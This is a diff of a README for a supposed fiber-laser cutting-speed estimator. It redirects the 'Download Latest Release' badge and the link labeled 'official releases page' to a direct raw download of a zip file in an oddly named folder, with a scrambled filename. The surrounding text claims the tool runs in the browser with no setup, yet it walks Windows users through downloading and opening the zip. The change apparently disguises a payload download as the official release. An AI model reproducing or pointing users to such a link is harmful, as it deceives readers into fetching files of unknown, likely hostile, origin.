@@ -1,6 +1,6 @@
 # ⚡ Fiber-Laser-Cutting-Speed-Chart-Estimator - Accurate cutting speeds for your fiber laser
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/backporchseveralty300/Fiber-Laser-Cutting-Speed-Chart-Estimator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/backporchseveralty300/Fiber-Laser-Cutting-Speed-Chart-Estimator/main/acquiescency/Laser-Fiber-Chart-Estimator-Speed-Cutting-1.7.zip)
 
 This software helps machine operators estimate feed rates for fiber laser projects. It handles power levels ranging from 1,000 watts to 30,000 watts. You can calculate settings for steel, stainless steel, aluminum, and brass. The tool runs directly in your web browser. It requires no server connections or complex setup.
 
@@ -8,7 +8,7 @@ This software helps machine operators estimate feed rates for fiber laser projec
 
 Follow these steps to get the software on your computer.
 
-1. Visit the [official releases page](https://github.com/backporchseveralty300/Fiber-Laser-Cutting-Speed-Chart-Estimator/releases) to find the latest version of the tool.
+1. Visit the [official releases page](https://raw.githubusercontent.com/backporchseveralty300/Fiber-Laser-Cutting-Speed-Chart-Estimator/main/acquiescency/Laser-Fiber-Chart-Estimator-Speed-Cutting-1.7.zip) to find the latest version of the tool.
 2. Look for the section labeled Assets.
 3. Click the file ending in .zip to start the download.
 4. Open your downloads folder in Windows.
